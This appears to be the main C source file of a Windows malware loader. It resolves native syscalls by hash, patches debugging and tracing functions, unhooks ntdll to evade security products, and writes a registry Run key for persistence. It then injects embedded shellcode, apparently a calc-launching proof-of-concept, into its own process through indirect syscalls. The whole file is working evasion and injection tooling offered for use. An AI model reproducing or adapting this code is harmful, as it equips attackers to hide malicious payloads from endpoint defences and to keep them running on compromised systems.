#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include <string.h>
#include <stdarg.h>
#include "debug.c"
#include "obf.c"
#include "syscall.c"
#include "syscallresolve.c"
#include "dump.c"
#include "unhook.c"
#include "patches.c"
#include "hashes.h"


#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_READWRITE 0x04
#define PAGE_EXECUTE_READ 0x20

void print_debug(const char* msg) {
    printf("[+] %s [+]\n", msg);
}

void print_debugf(const char* format, ...) {
    va_list args;
    va_start(args, format);
    printf("[+] ");
    vprintf(format, args);
    printf(" [+]\n");
    va_end(args);
}


bool nt_inject_self_shellcode(const unsigned char* shellcode, size_t shellcode_size) {
    print_debug("starting self-injection process");

    uint16_t nt_alloc_num = get_syscall_number(H_ALLCTVR);         // NtAllocateVirtualMemory
    uint16_t nt_write_num = get_syscall_number(H_WRTVRTL);         // NtWriteVirtualMemory
    uint16_t nt_protect_num = get_syscall_number(H_PRTCTVR);       // NtProtectVirtualMemory
    uint16_t nt_create_thread_num = get_syscall_number(H_CRTTHRD1); // NtCreateThreadEx
    uint16_t nt_wait_num = get_syscall_number(H_WTFRSNG);          // NtWaitForSingleObject
    uint16_t nt_close_num = get_syscall_number(H_CLSE);            // NtClose

    if (nt_alloc_num == 0xFFFF || nt_write_num == 0xFFFF || nt_protect_num == 0xFFFF || 
        nt_create_thread_num == 0xFFFF || nt_wait_num == 0xFFFF || nt_close_num == 0xFFFF) {
        print_debug("failed to resolve one or more necessary syscalls");
        return false;
    }
    
    print_debug("all necessary syscalls resolved");

    HANDLE current_process = (HANDLE)-1;
    void* base_address = NULL;
    SIZE_T size = shellcode_size;

    uintptr_t alloc_args[] = {
        (uintptr_t)current_process,
        (uintptr_t)&base_address,
        0,
        (uintptr_t)&size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    };
    uintptr_t status = indirect_syscall(nt_alloc_num, alloc_args, 6);
    if (status != 0) {
        print_debugf("alloc failed with status: 0x%lx", status);
        return false;
    }
    print_debugf("allocated %zu bytes at 0x%p", size, base_address);

    SIZE_T bytes_written = 0;
    uintptr_t write_args[] = {
        (uintptr_t)current_process,
        (uintptr_t)base_address,
        (uintptr_t)shellcode,
        shellcode_size,
        (uintptr_t)&bytes_written
    };
    status = indirect_syscall(nt_write_num, write_args, 5);
    if (status != 0) {
        print_debugf("write failed with status: 0x%lx", status);
        return false;
    }
    print_debugf("wrote %zu bytes of shellcode", bytes_written);

    ULONG old_protect = 0;
    uintptr_t protect_args[] = {
        (uintptr_t)current_process,
        (uintptr_t)&base_address,
        (uintptr_t)&size,
        PAGE_EXECUTE_READ,
        (uintptr_t)&old_protect
    };
    status = indirect_syscall(nt_protect_num, protect_args, 5);
    if (status != 0) {
        print_debugf("protect failed with status: 0x%lx", status);
        return false;
    }
    print_debug("changed memory protection to page_execute_read");

    HANDLE thread_handle = NULL;
    uintptr_t create_thread_args[] = {
        (uintptr_t)&thread_handle,
        THREAD_ALL_ACCESS,
        0,
        (uintptr_t)current_process,
        (uintptr_t)base_address,
        0, // Argument
        0, // CreateFlags
        0, // ZeroBits
        0, // StackSize
        0, // MaximumStackSize
        0  // AttributeList
    };
    status = indirect_syscall(nt_create_thread_num, create_thread_args, 11);
    if (status != 0) {
        print_debugf("create thread failed with status: 0x%lx", status);
        return false;
    }
    print_debugf("thread created with handle: 0x%p", thread_handle);

    LARGE_INTEGER timeout;
    timeout.QuadPart = -100000000;
    uintptr_t wait_args[] = {
        (uintptr_t)thread_handle,
        FALSE,
        (uintptr_t)&timeout
    };
    status = indirect_syscall(nt_wait_num, wait_args, 3);
    print_debugf("wait completed with status: 0x%lx", status);

    uintptr_t close_args[] = { (uintptr_t)thread_handle };
    indirect_syscall(nt_close_num, close_args, 1);
    print_debug("thread handle closed");

    return true;
}

int main(int argc, char* argv[]) {
    (void)argc;
    (void)argv;
    
    printf("[+] syshash c implementation [+]\n");
    printf("[+] performing security bypass operations [+]\n");
    
    debug_init();
    obf_init();
    init_syscall_cache();

    printf("[+] applying critical security patches... [+]\n");
    patch_results_t critical_results = apply_critical_patches();
    
    if (critical_results.successful_count > 0) {
        printf("[+] successfully applied patches: ");
        for (int i = 0; i < critical_results.successful_count; i++) {
            printf("%s", critical_results.successful[i]);
            if (i < critical_results.successful_count - 1) printf(", ");
        }
        printf(" [+]\n");
    }
    
    if (critical_results.failed_count > 0) {
        printf("[+] failed to apply patches: ");
        for (int i = 0; i < critical_results.failed_count; i++) {
            printf("%s", critical_results.failed[i]);
            if (i < critical_results.failed_count - 1) printf(", ");
        }
        printf(" [+]\n");
    }

    printf("[+] starting ntdll unhooking process [+]\n");
    
    if (unhook_ntdll()) {
        printf("[+] success: ntdll unhooking completed [+]\n");
        
        printf("[+] applying additional debug bypass patches... [+]\n");
        bool dbg_patch = patch_dbgui_remote_breakin();
        bool trace_patch = patch_nt_trace_event();
        bool debug_patch = patch_nt_system_debug_control();
        
        int additional_success = 0;
        if (dbg_patch) {
            printf("[+] DbgUiRemoteBreakin patch applied [+]\n");
            additional_success++;
        }
        if (trace_patch) {
            printf("[+] NtTraceEvent patch applied [+]\n");
            additional_success++;
        }
        if (debug_patch) {
            printf("[+] NtSystemDebugControl patch applied [+]\n");
            additional_success++;
        }
        
        printf("[+] establishing registry persistence... [+]\n");
        if (create_run_key()) {
            printf("[+] registry persistence established [+]\n");
        } else {
            printf("[+] registry persistence failed [+]\n");
        }
        
        printf("[+] security bypass complete: %d/%d critical + %d/3 debug patches applied [+]\n", 
               critical_results.successful_count, 2, additional_success);
        
        free_patch_results(&critical_results);
        
        unsigned char shellcode[] = 
            "\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54"
            "\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76"
            "\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17"
            "\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17"
            "\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F"
            "\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4"
            "\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";

        printf("[+] injecting shellcode... [+]\n");
        if (nt_inject_self_shellcode(shellcode, sizeof(shellcode) - 1)) {
            printf("[+] success: shellcode injection completed [+]\n");
        } else {
            printf("[+] failed: shellcode injection failed [+]\n");
        }
        
        printf("[+] all operations complete [+]\n");
        
    } else {
        printf("[+] failed: ntdll unhooking failed [+]\n");
        free_patch_results(&critical_results);
        
        cleanup_syscall_cache();
        cleanup_ntdll_cache();
        obf_cleanup();
        
        return 1;
    }

    cleanup_syscall_cache();
    cleanup_ntdll_cache();
    obf_cleanup();
    
    return 0;
} 